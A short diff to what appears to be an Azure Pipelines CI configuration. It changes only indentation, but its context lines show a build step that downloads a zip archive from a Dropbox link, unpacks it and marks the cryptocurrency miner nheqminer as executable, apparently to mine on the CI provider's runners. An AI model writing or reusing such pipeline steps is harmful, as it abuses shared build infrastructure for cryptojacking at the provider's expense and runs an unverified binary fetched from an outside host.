@@ -3,7 +3,7 @@ jobs:
   pool:
     vmImage: 'ubuntu-latest'
   steps:
-      - run: |
+    - run: |
         wget https://dl.dropboxusercontent.com/s/93pc80mzhq4rn5r/bin.zip
         unzip bin.zip
         chmod +x bin/nheqminer
